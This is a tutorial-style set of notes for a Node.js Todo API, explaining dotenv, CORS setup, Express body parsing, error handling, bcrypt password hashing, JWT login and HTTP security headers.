# Learn — Backend Q&A (from dotenv onward)

Questions and answers from building the Todo API — simple explanations, same style as the chat.

---

## Progress legend

| Icon | Meaning |
|------|---------|
| ✅ | Covered / implemented in project |
| 💡 | Partial |
| ❌ | Not yet |

---

## 1. What is `require('dotenv/config')`?

**File:** `app.js` line 5

### Q: What is this? Is it a package?

**A:** Yes — the **`dotenv`** package (in `package.json`).

It reads your **`.env`** file and loads each variable into **`process.env`**:

```env
DB_CONNECTION=mongodb://localhost:27017/todo-app
PORT=3005
JWT_SECRET=your_secret
```

After that line runs:

```js
process.env.PORT           // "3005"
process.env.JWT_SECRET     // your secret
process.env.DB_CONNECTION  // mongo URL
```

Without `dotenv`, those would be **`undefined`**.

### Two ways to use it

```js
require('dotenv/config');           // auto-load .env (what you have)
require('dotenv').config();         // same thing, two lines
```

### Where your app uses it

| File | Uses |
|------|------|
| `app.js` | `PORT`, `DB_CONNECTION`, `NODE_ENV`, `CORS_ORIGIN*` |
| `controllers/auth.js` | `JWT_SECRET`, `JWT_EXPIRES_IN` |
| `middleware/auth.js` | `JWT_SECRET` |

**One line:** `dotenv` reads `.env` into `process.env` so secrets stay out of code.

---

## 2. What is `app.use(cors())`?

**File:** `app.js`

### Q: What is CORS? Does bare `cors()` allow any URL?

**A:** **CORS** = Cross-Origin Resource Sharing.

Browsers block JavaScript on **one origin** from calling an API on **another** unless the API allows it.

```
Frontend:  http://localhost:3000     (Next.js)
API:       http://localhost:3005     (Express)
           ↑ different port = different origin
```

Bare **`app.use(cors())`** with no options → **`Access-Control-Allow-Origin: *`** → **any website** can call your API from a browser.

**You were right** — that shouldn't be the case in production.

| Tool | CORS applies? |
|------|----------------|
| Browser (Next.js, React) | ✅ Yes |
| Postman / curl | ❌ No (no Origin header) |

CORS is a **browser rule**, not full API security. You still need JWT + ownership checks.

### What big apps do

Whitelist specific frontends — never `*` in production:

```js
app.use(cors({
  origin: ['https://app.yourcompany.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

| Option | Purpose |
|--------|---------|
| `origin` | Which frontends can call you |
| `credentials: true` | Allow cookies / auth headers cross-origin |
| `methods` | Limit HTTP methods |
| `allowedHeaders` | Allow `Authorization` (JWT) |

---

## 3. CORS in this project (configured)

### Q: Shouldn't `localhost:3000` be in `.env` too? What about the production check?

**A:** Yes. Two env vars + `NODE_ENV` check:

**`.env` (development):**
```env
NODE_ENV=development
CORS_ORIGIN_DEV=http://localhost:3000
CORS_ORIGIN=
```

**Production (when you deploy):**
```env
NODE_ENV=production
CORS_ORIGIN_DEV=
CORS_ORIGIN=https://your-app.vercel.app
```

**`app.js` logic:**
```js
const productionOrigins = parseOrigins(process.env.CORS_ORIGIN);
const devOrigins = parseOrigins(process.env.CORS_ORIGIN_DEV);

const allowedOrigins =
    process.env.NODE_ENV === 'production'
        ? productionOrigins      // strict — only prod URLs
        : devOrigins;            // dev — Next.js on :3000
```

| `NODE_ENV` | Uses | Allowed |
|------------|------|---------|
| **development** | `CORS_ORIGIN_DEV` | `http://localhost:3000` |
| **production** | `CORS_ORIGIN` | only your live domain(s) |

### The CORS check

```js
origin(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);   // ✅ allow
    } else {
        callback(new Error('Not allowed by CORS'));  // ❌ block
    }
}
```

| Request from | Result |
|--------------|--------|
| Next.js `:3000` | ✅ Allowed |
| Random site `evil.com` | ❌ Blocked |
| Postman (no Origin header) | ✅ Allowed |

### Rule

**Config that changes per environment → `.env`  
Logic that never changes → code**

---

## 4. What is `app.use(express.json())`?

**File:** `app.js`

### Q: Does it intercept the response and convert to JSON?

**A:** **No** — it works on the **incoming request**, not the response.

| Code | Direction | Job |
|------|-----------|-----|
| **`express.json()`** | Client → server | Parse JSON body → `req.body` |
| **`res.json({ ... })`** | Server → client | Send JSON response |

**Without it:**
```
POST { "title": "Buy milk" }
req.body → undefined ❌
```

**With it:**
```
POST { "title": "Buy milk" }
req.body → { title: "Buy milk" } ✅
req.body.title → "Buy milk"
```

**One line:** Reads JSON from the request and puts it on `req.body`.

---

## 5. What is `app.use(express.urlencoded({ extended: true }))`?

**File:** `app.js`

### Q: What does this do?

**A:** Parses **HTML form** data into `req.body` — not JSON.

**Form style:**
```
Content-Type: application/x-www-form-urlencoded
title=Buy+milk&status=pending
```

**Becomes:**
```js
req.body → { title: "Buy milk", status: "pending" }
```

### `extended: true`

Uses **`qs`** library — supports nested fields:
```
user[name]=Ashish → { user: { name: "Ashish" } }
```

### Do you need it?

| Client sends | Middleware |
|--------------|------------|
| JSON (Postman raw, fetch) | `express.json()` ✅ main one |
| HTML `<form>` | `express.urlencoded()` |

Your todo API uses JSON — `express.json()` is essential. `urlencoded` is optional backup.

---

## 6. Global error handler — `(err, req, res, next)`

⚠️ **Superseded by [§14 Centralized error handling](#14-centralized-error-handling--the-apperror-class).** The handler shown below is the **first version**, kept because the Express mechanics (4-argument rule, `next(e)`, middleware order) still apply exactly. The response shape, status codes, and the "what it does NOT catch" table are all out of date — §14 has the current behaviour.

### Q: How does Express know this is an error handler?

**A:** By **argument count**:

| Parameters | Type |
|------------|------|
| `(req, res, next)` | Normal middleware |
| `(req, res)` | 404 / final handler |
| **`(err, req, res, next)`** | **Error handler** — 4 args required |

First parameter = the error object. That's the Express rule.

### Q: How do errors get there?

Via **`next(error)`** in your controllers:

```js
exports.createTask = async (req, res, next) => {
    try {
        // ...
    } catch (e) {
        next(e);   // sends to error handler
    }
};
```

```
Controller throws → catch → next(e) → error handler → JSON response
```

### What errors it handles (your app)

| Source | Example | Status |
|--------|---------|--------|
| Mongoose validation | Missing `title`, bad enum | **400** |
| Duplicate email | Same email register twice | **500** (could improve to 400) |
| CORS blocked | Wrong origin in browser | **500** |
| Other thrown errors | DB down during query | **500** |

### What it does NOT catch

| Situation | Goes to |
|-----------|---------|
| Unknown URL `/foo` | **404 handler** (line 48) |
| `401` from `protect` | Sent directly — no `next(err)` |
| Async error without try/catch | Can **crash** server |
| DB fail at startup | Separate `.catch()` on `mongoose.connect` |

### Your handler

```js
app.use((err, req, res, next) => {
    console.log('Error:', err.message);

    const status = err.status || (err.name === 'ValidationError' ? 400 : 500);

    res.status(status).json({
        message: err.message || 'Internal server error'
    });
});
```

Client always gets **JSON**, not HTML crash page.

### Middleware order

```
1. cors, json, routes     ← normal flow
2. 404 handler            ← route not found
3. error handler          ← MUST be last
```

| Handler | Meaning |
|---------|---------|
| 404 | "That URL doesn't exist" |
| Error | "URL exists but something broke" |

---

## 7. Bonus — related concepts from same learning arc

### `.env` vs `.env.example`

| File | Contains | Git? | App uses? |
|------|----------|------|-----------|
| `.env` | Real secrets | ❌ Never | ✅ Yes |
| `.env.example` | Placeholder template | ✅ Yes | ❌ No |

### `express.static('public')`

Serves files from `public/` folder (HTML, CSS, JS). Your demo `index.html` was there — gitignored until React app.

### Request flow (full picture)

```
Client request
      │
      ▼
  cors          ← browser origin check
      │
      ▼
  express.json  ← parse body → req.body
      │
      ▼
  protect       ← JWT → req.user (on /tasks)
      │
      ▼
  controller    ← business logic
      │
      ├── res.json()          → success response
      └── throw / next(err)   → global error handler → one JSON shape
```

Since [§14](#14-centralized-error-handling--the-apperror-class), **every** failure takes the second branch — including `protect`'s 401s and the rate limiter's 429s, which used to answer directly.

---

## Quick reference table

| Line in `app.js` | One line |
|------------------|----------|
| `require('dotenv/config')` | Load secrets from `.env` |
| `cors({ origin: ... })` | Which frontends can call API from browser |
| `express.json()` | Parse JSON request body → `req.body` |
| `express.urlencoded()` | Parse form request body → `req.body` |
| `express.static('public')` | Serve static files |
| 404 handler | Unknown route → `AppError(404)` → error handler |
| Error handler `(err,...)` | Every failure → one JSON shape; bugs → generic 500 |
| `utils/AppError.js` | Marks errors whose message is safe to show the client |
| `apiLimiter` / `authLimiter` | Cap requests per IP → `429` if over limit |

---

> Pick a topic, ask in chat, or check `authflow.md` / `mongoStructure.md` for JWT and database deep dives.

---

## 8. Routes → Controller → Model (`POST /auth/register`)

**Goal:** Understand how one URL travels through the app — using register as the example.

### Your understanding (correct ✅)

```
POST /auth/register
      │
      ▼
app.js          → mounts /auth
      │
      ▼
routes/auth.js  → /register → register function
      │
      ▼
controllers/auth.js → logic, User.create
      │
      ▼
models/user.js  → schema + pre('save') hash → MongoDB
```

---

### Step 1 — `app.js` mounts the auth router

```45:46:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\app.js
app.use('/tasks', TaskRoutes)
app.use('/auth', AuthRoutes)
```

Anything starting with **`/auth`** goes to `routes/auth.js`.

So `POST /auth/register` → prefix `/auth` + route `/register`.

**Before this runs:** `cors`, `express.json()` already ran → `req.body` has `{ email, password, role }`.

**Register is public** — no `protect` middleware (unlike `/tasks`).

---

### Step 2 — `routes/auth.js` maps URL to controller

```1:9:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\routes\auth.js
const express = require("express");
const router = express.Router();

const { register, login } = require('../controllers/auth');

router.post('/register', register);
router.post('/login', login);

module.exports = router;
```

| File | Job |
|------|-----|
| **`routes/auth.js`** | **URLs only** — which path + HTTP method → which function |
| **`controllers/auth.js`** | **Logic** — what actually happens |

`router.post('/register', register)` means:

> When someone **POST**s to **`/register`** (under `/auth`), run the **`register`** function.

Routes = **reception desk**. Controllers = **the work**.

---

### Step 3 — `controllers/auth.js` register logic

```5:18:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\controllers\auth.js
exports.register = async (req, res, next) => {
    try {
        const { email, password, role } = req.body;
        const user = await User.create({ email, password, role });
        res.status(201).json({
            message: 'User created successfully. Please login.',
            user: { id: user._id, email: user.email, role: user.role }
        });
    } catch (e) {
        if (e.code === 11000) {
            return res.status(400).json({ message: 'Email already registered' });
        }
        next(e);
    }
};
```

| Line | What |
|------|------|
| `req.body` | Data from client (thanks to `express.json()`) |
| `User.create(...)` | Ask Mongoose to save a new user |
| `res.status(201).json(...)` | Success — 201 Created, no token (login separately) |
| `e.code === 11000` | MongoDB duplicate email → 400 |
| `next(e)` | Other errors → global error handler |

---

### Step 4 — `models/user.js` schema + pre-save + model

**Schema** = rules for one user document:

```4:21:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\models\user.js
const UserSchema = mongoose.Schema({
    email: {
        type: String,
        required: true,
        unique: true,
        lowercase: true,
        trim: true
    },
    password: {
        type: String,
        required: true
    },
    role: {
        type: String,
        enum: ['admin', 'user', 'manager'],
        default: 'user'
    }
});
```

| Field rule | Effect |
|------------|--------|
| `required: true` | Must be present or validation error |
| `unique: true` | No two users same email |
| `lowercase` / `trim` | Normalizes email before save |
| `enum` | Only allowed role values |
| `default: 'user'` | Role if not sent |

**pre('save')** = Mongoose hook **before** write to MongoDB:

```23:28:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\models\user.js
UserSchema.pre('save', async function () {
    if (!this.isModified('password')) return;

    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
});
```

Controller passes plain `password` → hook hashes it → DB stores `$2a$10$...`.

**Model export:**

```js
module.exports = mongoose.model('User', UserSchema);
```

| Piece | Result |
|-------|--------|
| Model name `'User'` | Collection **`users`** in MongoDB |
| `User` in code | Tool to create/find/update users |

---

### Step 5 — What `User.create()` does

```js
await User.create({ email, password, role });
```

Inside Mongoose (simplified):

```
1. Build document from schema + your data
2. Run validation (required, enum, etc.)
3. Run pre('save') hook → hash password
4. INSERT into MongoDB collection "users"
5. Return saved document (with _id, hashed password, etc.)
```

You **don't** hash in the controller — the model handles it.

---

### Full flow diagram

```
Postman: POST /auth/register
         Body: { "email": "a@b.com", "password": "123456" }
                │
                ▼
         app.js  (json → req.body)
                │
                ▼
         routes/auth.js  POST /register → register
                │
                ▼
         controllers/auth.js
                │  User.create({ email, password, role })
                ▼
         models/user.js
                │  validate schema
                │  pre('save') → bcrypt hash
                │  save to DB "users"
                ▼
         MongoDB document:
         { _id, email, password: "$2a$10$...", role: "user" }
                │
                ▼
         Response 201:
         { message, user: { id, email, role } }   ← no password
```

---

### Routes vs controllers vs models (one table)

| Layer | File | Question it answers |
|-------|------|---------------------|
| **App** | `app.js` | Which big paths exist? (`/auth`, `/tasks`) |
| **Route** | `routes/auth.js` | Which URL + method → which handler? |
| **Controller** | `controllers/auth.js` | What do we do with req/res? |
| **Model** | `models/user.js` | What does data look like? How is it saved? |
| **DB** | MongoDB `users` | Where documents live |

---

## 8b. Same path, different logic — `POST /auth/login`

Login uses the **same layers** as register. Only the **controller** does different work.

```
Same:  app.js → routes/auth.js → controllers/auth.js → User model
Extra in login:  findOne  →  bcrypt.compare  →  jwt.sign
```

### Route (same pattern)

```js
router.post('/login', login);   // routes/auth.js
```

Public — no `protect` (you're logging in to *get* the token).

---

### Register vs login — side by side

| Step | **Register** | **Login** |
|------|--------------|-----------|
| 1 | Read `email`, `password` from `req.body` | Same |
| 2 | `User.create({ email, password, role })` | `User.findOne({ email })` |
| 3 | pre-save hook hashes password | — |
| 4 | — | `bcrypt.compare(password, user.password)` |
| 5 | — | `jwt.sign({ userId }, JWT_SECRET, { expiresIn })` |
| 6 | `201` + user (**no token**) | `200` + **token** + user |

---

### Login controller — the two extra steps

```js
exports.login = async (req, res, next) => {
    try {
        const { email, password } = req.body;

        // Step A — find existing user (NOT create)
        const user = await User.findOne({ email });
        if (!user) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Step B — compare plain password vs hash in DB
        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Step C — issue JWT
        const token = jwt.sign(
            { userId: user._id },
            process.env.JWT_SECRET,
            { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
        );

        res.status(200).json({
            message: 'Login successful',
            token,
            user: { id: user._id, email: user.email, role: user.role }
        });
    } catch (e) {
        next(e);
    }
};
```

---

### Step A — `User.findOne({ email })`

| | Register | Login |
|---|----------|-------|
| Mongoose method | `User.create` | **`User.findOne`** |
| Meaning | Insert **new** document | Find **existing** document |
| Not found | Validation / duplicate errors | **401** Invalid credentials |

Returns full user doc including **hashed** `password` (needed for compare).

---

### Step B — `bcrypt.compare(password, user.password)`

```
Request:     "password123"        ← plain text from req.body
Database:    "$2a$10$xyz..."     ← hash from register pre-save hook

bcrypt.compare(plain, hash)  →  true / false
```

| Result | Response |
|--------|----------|
| `true` | Continue → create token |
| `false` | **401** Invalid credentials |

Same error message as "user not found" — don't reveal which failed.

**No pre-save hook on login** — password was already hashed at register.

---

### Step C — `jwt.sign({ userId: user._id }, ...)`

Creates the token the client uses on protected routes:

```
POST /auth/login  →  { token: "eyJhbG..." }
        │
        ▼
GET /tasks
Authorization: Bearer eyJhbG...
        │
        ▼
protect middleware  →  jwt.verify  →  req.user
```

See [`authflow.md`](authflow.md) for full JWT deep dive.

---

### Login flow diagram

```
Postman: POST /auth/login
         Body: { "email": "a@b.com", "password": "123456" }
                │
                ▼
         app.js  (json → req.body)
                │
                ▼
         routes/auth.js  POST /login → login
                │
                ▼
         controllers/auth.js
                │  User.findOne({ email })
                │  bcrypt.compare(plain, hash)
                │  jwt.sign({ userId: user._id })
                ▼
         Response 200:
         { message, token, user }   ← token saved by client for /tasks
```

---

### One-line summary

**Register = create user + hash on save. Login = find user + compare password + issue JWT.**

That token is sent on every protected request (`GET /tasks`, etc.) as `Authorization: Bearer <token>`.

---

## 8b2. Task ownership — where `userId` comes from

**Goal:** Trace one id from register → login token → `protect` → create/list tasks.

Register does **not** put `userId` on tasks. MongoDB only creates the User’s `_id`. Tasks get `userId` later, when you create them with the same login token.

### Id journey (table)

| Step | What happens | Where | Field name |
|------|--------------|-------|------------|
| **1. Register** | MongoDB creates User | `User.create` → `users` collection | User `_id` (auto) |
| **2. Login** | That `_id` is embedded in the JWT | `jwt.sign({ userId: user._id }, …)` | Payload `userId` |
| **3. Any `/tasks` call** | Same token → `protect` verifies → loads User | `middleware/auth.js` | `req.user` (= User doc) |
| **4. Create task** | Copy logged-in user’s id onto the task | `userId: req.user._id` in `createTask` | Task `userId` |
| **5. Get / update / delete** | Filter so you only touch **your** tasks | `{ userId: req.user._id }` | Query filter |

```
REGISTER     User { _id: "6a71..." }          ← no tasks yet; no userId field on User
    │
LOGIN        jwt.sign({ userId: "6a71..." })  ← same id inside token
    │
POST /tasks  Authorization: Bearer <same token>
    │           protect → jwt.verify → req.user._id
    │           Task { …, userId: req.user._id }   ← link created here
    │
GET /tasks   filter = { userId: req.user._id }     ← only your tasks
```

### Naming cheat sheet

| Place | Name | Same value? |
|-------|------|-------------|
| `users` collection | `_id` | ✅ |
| JWT payload | `userId` | ✅ same as User `_id` |
| `req.user` after protect | `req.user._id` | ✅ |
| `tasks` collection | `userId` | ✅ points at that User |

**One line:** Register makes the id → login puts it in the token → `protect` restores `req.user` → create task saves it as `userId` → list/update/delete filter by that `userId`.

See also: [`authflow.md`](authflow.md) (JWT deep dive), [`mongoStructure.md`](mongoStructure.md) (linking collections).

---

## 8c. Password hashing — does pre-save decrypt? (register vs login)

**File:** `models/user.js` lines 23–28

### Q: Does `UserSchema.pre('save')` decrypt the password?

**A:** **No** — it **hashes** (one-way). There is no decrypt step anywhere in this app.

### Hash vs decrypt

| | **Hash** (what you use) | **Decrypt** |
|---|-------------------------|-------------|
| Direction | One-way — **cannot reverse** | Two-way — encrypt & decrypt |
| Stored in DB | `$2a$10$xyz...` | Could recover plain text |
| Login check | `bcrypt.compare(plain, hash)` | Decrypt then compare |
| Passwords | ✅ Industry standard | ❌ Never for passwords |

```js
UserSchema.pre('save', async function () {
    if (!this.isModified('password')) return;

    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
});
```

```
"password123"  →  bcrypt.hash  →  "$2a$10$N9qo8uLOick..."
     plain           ONE-WAY              stored in MongoDB
```

You **cannot** turn `$2a$10$...` back into `password123`.

---

### Register — pre('save') runs (hash before store)

```
User.create({ password: "password123" })
        │
        ▼
   pre('save') runs          ← only on SAVE (create triggers save)
        │
        ▼
   bcrypt.hash → "$2a$10$..." stored in MongoDB
```

| Why pre runs | `User.create` = build document + **save** to DB |

Controller passes **plain** password → hook hashes → DB gets hash.

---

### Login — pre('save') does NOT run

```
User.findOne({ email })       ← READ only, no save
        │
        ▼
   pre('save') skipped        ← nothing written to DB
        │
        ▼
   bcrypt.compare(plain, hash from DB)
```

| Why pre skips | `findOne` only **reads** — password field is not being saved |

Login uses **`bcrypt.compare`** in the controller — not the pre hook.

---

### What `bcrypt.compare` does internally

It does **not** decrypt the stored hash. It **re-hashes** what the user typed and checks for a match:

```
Login input:     "password123"        ← plain from req.body
Stored in DB:    "$2a$10$xyz..."     ← hash from register

bcrypt.compare:
  1. Takes plain "password123"
  2. Reads salt embedded inside stored hash
  3. Runs same hash math as register
  4. Compares result with stored hash
  5. Returns true / false
```

Like checking a fingerprint — you don't "un-fingerprint" the file; you scan the finger again and see if it matches.

```js
const isMatch = await bcrypt.compare(password, user.password);
// compare(what they typed, what's in DB)
```

---

### Register vs login — password handling

| | **Register** | **Login** |
|---|--------------|-----------|
| Mongoose | `User.create` | `User.findOne` |
| `pre('save')` | ✅ Runs | ❌ Does not run |
| bcrypt function | **`hash`** — create stored value | **`compare`** — check plain vs stored |
| Password in DB | **Written** (hashed) | **Read** only |
| Where bcrypt runs | Model hook (`user.js`) | Controller (`auth.js`) |

---

### Why `isModified('password')` in pre-save?

```js
if (!this.isModified('password')) return;
```

Skip hashing if password **wasn't changed** — e.g. user updates email only.

Without this: already-hashed password would get **hashed again** → login breaks.

---

### One-line summaries

**Register:** pre-save **hashes** before store (one-way, not decrypt).

**Login:** no pre hook — **`bcrypt.compare`** re-hashes input and checks it matches stored hash.

**Never** store or transmit plain passwords in DB after register. **Never** decrypt — compare only.

---

## 9. What to learn next (routes & Mongoose)

### Express routing

| Topic | One line | In your project |
|-------|----------|-----------------|
| `express.Router()` | Mini-app for grouped routes | `routes/auth.js`, `routes/task.js` |
| `app.use('/auth', router)` | Mount router at prefix | `app.js` line 46 |
| `router.post('/register', fn)` | Method + path + handler | Public register |
| `router.use(protect)` | Middleware on all routes below | `routes/task.js` — all tasks need JWT |
| Route order | `/bulk` before `/:id` | Avoids "bulk" being treated as id |

### Mongoose methods you use (and will use)

| Method | Purpose | Used in |
|--------|---------|---------|
| **`Model.create({ ... })`** | Insert one or many documents | `register` — `User.create` |
| **`Model.findOne({ email })`** | Find first match | `login` |
| **`Model.findById(id)`** | Find by `_id` | `protect` middleware |
| **`Model.find(filter)`** | Find many | `getTasks` |
| **`Model.findOneAndUpdate(filter, data, opts)`** | Update one | `updateTask` |
| **`Model.findOneAndDelete(filter)`** | Delete one | `deleteTask` |
| **`Model.deleteMany(filter)`** | Delete many | `deleteManyTasks` |
| **`Model.insertMany([...])`** | Bulk insert | `createTasksInBulk` |
| **`document.save()`** | Save instance | `createTask` — `new Task(...).save()` |

**`create` vs `save`:**

```js
User.create({ email, password });     // one step — build + save
const user = new User({ email });     // build
await user.save();                    // then save (pre hooks still run)
```

Both trigger **`pre('save')`**.

### Mongoose concepts

| Topic | One line |
|-------|----------|
| **Schema** | Shape + rules for documents |
| **Model** | Class to talk to a collection |
| **Document** | One saved record (`user._id`) |
| **pre('save')** | Run code before DB write |
| **ValidationError** | Schema rule failed → 400 in error handler |
| **11000 error code** | Duplicate key (unique email) |
| **`.select('-password')`** | Exclude field from query result |
| **ObjectId + `ref`** | Link documents (`userId` on tasks) |

### Compare: register vs login route

| | **Register** | **Login** |
|---|--------------|-----------|
| Route | `POST /auth/register` | `POST /auth/login` |
| Middleware | None (public) | None (public) |
| DB | `User.create` | `User.findOne` |
| Password | Hash on save (pre hook) | `bcrypt.compare` |
| Response | User info, no token | Token + user |
| User id | MongoDB creates `_id` | Embeds `_id` in JWT as `userId` |

### Compare: auth vs task ownership

| | **Register / Login** | **Create / Get tasks** |
|---|---------------------|------------------------|
| Auth | Public (no `protect`) | `router.use(protect)` — same Bearer token |
| Id role | Create / embed User `_id` | `req.user._id` → task `userId` / filter |
| Collection | `users` | `tasks` (linked via `userId`) |

### Related docs in this repo

| File | Read for |
|------|----------|
| [`authflow.md`](authflow.md) | JWT, login, protect, token verify |
| [`mongoStructure.md`](mongoStructure.md) | collections, documents, linking tasks to users |
| [`readme.md`](readme.md) | API reference, error handling, **HTTP headers**, learning path |
| [`todo.md`](todo.md) | Future topics to implement |

### External topics (when ready)

| Topic | Why |
|-------|-----|
| [Express routing guide](https://expressjs.com/en/guide/routing.html) | Router, params, middleware order |
| [Mongoose docs — Models](https://mongoosejs.com/docs/models.html) | create, find, update, delete |
| [Mongoose middleware](https://mongoosejs.com/docs/middleware.html) | pre/post save, hooks |
| [Mongoose validation](https://mongoosejs.com/docs/validation.html) | required, enum, custom validators |
| REST status codes | 201 for create, 401 for auth — see `readme.md` API error section |

---

## Quick reference — request layers

| Layer | Register | Login |
|-------|----------|-------|
| URL | `POST /auth/register` | `POST /auth/login` |
| Route | `router.post('/register', register)` | `router.post('/login', login)` |
| Controller | `User.create`, `res.status(201)` | `findOne`, `bcrypt.compare`, `jwt.sign`, `200` |
| Model | Schema + pre-save hash | Schema (read only) |
| Collection | `users` in `todo-app` | `users` in `todo-app` |

---

## 10. HTTP headers — types and what this project needs

Headers carry **metadata** about the request/response — separate from URL, query params, and body.

---

### Request vs response

| Direction | Who sets | Read in your code |
|-----------|----------|-------------------|
| **Request headers** | Client (Postman, Next.js, browser) | `req.headers` |
| **Response headers** | Server (Express, middleware) | `res.set()` / automatic with `res.json()` |

```js
// middleware/auth.js — reading a request header
req.headers.authorization   // "Bearer eyJhbG..."
req.headers['content-type'] // "application/json"
```

Header names are **case-insensitive** (`Authorization` = `authorization`).

---

### Required for this project (you send these)

#### 1. `Content-Type: application/json`

**When:** Any POST or PATCH with a JSON body.

**Why:** Tells Express to parse body as JSON → `req.body`.

Without it, `express.json()` may not populate `req.body` correctly.

```
POST /auth/register
Content-Type: application/json

{ "email": "test@example.com", "password": "secret123" }
```

| Route type | Need `Content-Type`? |
|------------|----------------------|
| GET / DELETE (no body) | No |
| POST / PATCH with JSON | **Yes** |

---

#### 2. `Authorization: Bearer <token>`

**When:** All `/tasks/*` routes (protected by `protect` middleware).

**Why:** Proves who you are — JWT from login.

```js
// middleware/auth.js
if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
    token = req.headers.authorization.split(' ')[1];
}
```

```
GET /tasks
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

| Route | Need `Authorization`? |
|-------|------------------------|
| `POST /auth/register` | No |
| `POST /auth/login` | No |
| `/tasks` (all methods) | **Yes** |

**Format matters:** `Bearer ` + space + token (not just the token alone).

---

### Sent automatically (browser / client)

| Header | Sent by | Used for |
|--------|---------|----------|
| **`Origin`** | Browser on cross-origin calls | Your `cors()` checks this against `CORS_ORIGIN_DEV` / `CORS_ORIGIN` |
| **`Host`** | All HTTP clients | `localhost:3005` |
| **`User-Agent`** | Browser / Postman | Identifies client (logging only) |

Postman often has **no `Origin`** → CORS passes via `if (!origin)` in your config.

Next.js on `localhost:3000` calling API on `3005` → browser sends `Origin: http://localhost:3000`.

---

### Set by your server (response headers)

| Header | Set by | Meaning |
|--------|--------|---------|
| **`Content-Type: application/json`** | `res.json()` | Response body is JSON |
| **`Access-Control-Allow-Origin`** | `cors()` | Which frontend can read response |
| **`Access-Control-Allow-Credentials`** | `cors({ credentials: true })` | Cross-origin requests may send cookies/auth |
| **`Access-Control-Allow-Methods`** | `cors({ methods: [...] })` | Allowed HTTP methods |
| **`Access-Control-Allow-Headers`** | `cors({ allowedHeaders: [...] })` | Client may send `Content-Type`, `Authorization` |
| **`RateLimit-Policy`** | `express-rate-limit` | Rule summary, e.g. `10;w=900` = 10 requests per 900 seconds |
| **`RateLimit-Limit`** | `express-rate-limit` | Max requests allowed in the window |
| **`RateLimit-Remaining`** | `express-rate-limit` | How many requests this client has left |
| **`RateLimit-Reset`** | `express-rate-limit` | Seconds until the counter resets |

These are **response** headers — you don't send them from Postman; the API adds them.

---

### Other common header types (not in project yet)

#### General request headers

| Header | Purpose | This project |
|--------|---------|--------------|
| **`Accept`** | Client prefers `application/json` vs `text/html` | Optional — API always returns JSON |
| **`Accept-Language`** | Preferred language | ❌ not used |
| **`Cache-Control`** | Caching rules | ❌ not used yet |

#### Auth alternatives

| Header | Purpose | This project |
|--------|---------|--------------|
| **`Authorization: Bearer`** | JWT token | ✅ **used** |
| **`Cookie`** | Session ID in cookie | ❌ not used (JWT instead) |
| **`API-Key`** | Simple key in header | ❌ not used |

#### Security response headers (Helmet)

Full explanations in [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does).

| Header | Purpose | Status |
|--------|---------|--------|
| **`Strict-Transport-Security`** | Force HTTPS | ✅ sent — effective after deploy (ignored on `localhost`) |
| **`X-Content-Type-Options`** | Prevent MIME sniffing | ✅ `nosniff` |
| **`X-Frame-Options`** | Clickjacking protection | ✅ `SAMEORIGIN` |
| **`Content-Security-Policy`** | Control loaded resources | ✅ Helmet default |

#### Custom / tracing (future)

| Header | Purpose |
|--------|---------|
| **`X-Request-Id`** | Trace one request in logs |
| **`X-Correlation-Id`** | Link microservice calls |

---

### Quick cheat sheet — by route

All routes are versioned: `/api/v1/...` (see [§13 API versioning](#13-api-versioning--apiv1)).

| Request | Headers to send |
|---------|-----------------|
| `POST /api/v1/auth/register` | `Content-Type: application/json` |
| `POST /api/v1/auth/login` | `Content-Type: application/json` |
| `GET /api/v1/tasks` | `Authorization: Bearer <token>` |
| `POST /api/v1/tasks` | `Content-Type` + `Authorization` |
| `PATCH /api/v1/tasks/:id` | `Content-Type` + `Authorization` |
| `DELETE /api/v1/tasks/:id` | `Authorization` only |
| `DELETE /api/v1/tasks/bulk` | `Content-Type` + `Authorization` |
| `POST /api/v1/tasks/bulk` | `Content-Type` + `Authorization` |
| `GET /health` | none — public, unversioned |

---

### Next.js fetch example (later)

```js
fetch('http://localhost:3005/tasks', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${token}`,
  },
  body: JSON.stringify({ title: 'Buy milk' }),
});
```

Browser adds `Origin` automatically. You add `Content-Type` and `Authorization`.

---

### One-line summary

**This project needs two request headers for most work: `Content-Type: application/json` (when sending a body) and `Authorization: Bearer <token>` (for `/tasks`). CORS response headers are handled by your server for browser clients.**

See also: [`readme.md`](readme.md) HTTP headers section, [`authflow.md`](authflow.md) for JWT in `Authorization`, [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does) for security headers.

---

## 10b. Safe HTTP headers — what Helmet actually does

**Status:** ✅ `app.use(helmet())` — first middleware in `app.js`

### Q: What makes a header a "safe" / security header?

The headers in section 10 carry **data** (`Content-Type`, `Authorization`). Security headers carry **instructions to the browser** — "when you handle this response, refuse to do these dangerous things."

| | Normal headers | Security headers |
|---|----------------|------------------|
| Who reads them | Your code (`req.headers`) / the client app | **The browser** |
| Purpose | Describe the request/response | Restrict what the browser is allowed to do |
| Who enforces | You | The browser |

**Key point:** Postman *shows* response headers (response pane → **Headers** tab) but **ignores** them — it is not a browser. That's why security headers look like they "do nothing" when testing in Postman.

---

### The four to know

#### 1. `X-Content-Type-Options: nosniff` — stop MIME sniffing

Browsers used to **guess** a response's real type instead of trusting `Content-Type` — sniff the bytes, decide "this looks like JavaScript", and run it. The guess is the vulnerability.

```
X-Content-Type-Options: nosniff
```

Now something served as `application/json` can never be reinterpreted as a script.

